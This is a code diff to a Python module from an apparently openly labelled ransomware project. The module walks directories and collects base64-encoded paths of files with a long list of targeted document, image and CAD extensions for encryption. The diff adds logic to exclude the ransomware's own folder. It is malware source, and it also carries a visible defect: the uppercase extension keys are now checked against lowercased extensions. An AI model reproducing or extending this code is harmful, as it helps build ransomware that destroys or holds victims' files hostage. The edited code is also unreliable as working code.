@@ -1,9 +1,11 @@
 import os
 import base64
 
-# return the base64 encoded path of the files
 def find_files(path):
-    file_format = {'.DOC': 0, '.DOCX': 0, '.XLS': 0, '.XLSX': 0, '.PPT': 0, '.PPTX': 0, '.PST': 0, '.OST': 0, '.MSG': 0, '.EML': 0, '.VSD\
+    # Get absolute path of the Ransomware folder to exclude it
+    ransomware_folder = os.path.abspath(os.path.dirname(__file__))
+    
+    extensions = {'.DOC': 0, '.DOCX': 0, '.XLS': 0, '.XLSX': 0, '.PPT': 0, '.PPTX': 0, '.PST': 0, '.OST': 0, '.MSG': 0, '.EML': 0, '.VSD\
 ': 0, '.VSDX': 0, '.TXT': 0, '.CSV': 0, '.RTF': 0, '.WKS': 0, '.WK1': 0, '.PDF': 0, '.DWG': 0, '.ONETOC2': 0, '.SNT': 0
 , '.JPEG': 0, '.JPG': 0, '.DOCB': 0, '.DOCM': 0, '.DOT': 0, '.DOTM': 0, '.DOTX': 0, '.XLSM': 0, '.XLSB': 0, '.XLW': 0, 
 '.XLT': 0, '.XLM': 0, '.XLC': 0, '.XLTX': 0, '.XLTM': 0, '.PPTM': 0, '.POT': 0, '.PPS': 0, '.PPSM': 0, '.PPSX': 0, '.PP\
@@ -23,12 +25,21 @@ SXC': 0, '.OTS': 0, '.ODS': 0, '.3DM': 0, '.MAX': 0, '.3DS': 0, '.UOT': 0, '.STW
     
     f = []
     for actual_path, directories, files_found in os.walk(path):
+        # Skip the ransomware folder and its subdirectories
+        if ransomware_folder in os.path.abspath(actual_path):
+            continue
+            
         for arq in files_found:
-            extensao = os.path.splitext(os.path.join(actual_path, arq))[1].upper()
-            if(file_format.get(extensao) == 0 or extensao == ''):
-                f.append(base64.b64encode(os.path.join(actual_path, arq).encode()))
+            file_path = os.path.join(actual_path, arq)
+            abs_filepath = os.path.abspath(file_path)
+            
+            # Skip any file inside the ransomware folder
+            if ransomware_folder in abs_filepath:
+                continue
+                
+            # Only encrypt files with target extensions
+            extension = os.path.splitext(file_path)[1].lower()
+            if extension in extensions:
+                f.append(base64.b64encode(file_path.encode('utf-8')))
+    
     return f
-
-if __name__  == "__main__":
-    for x in find_files(os.path.expanduser('~')):
-        print(x)
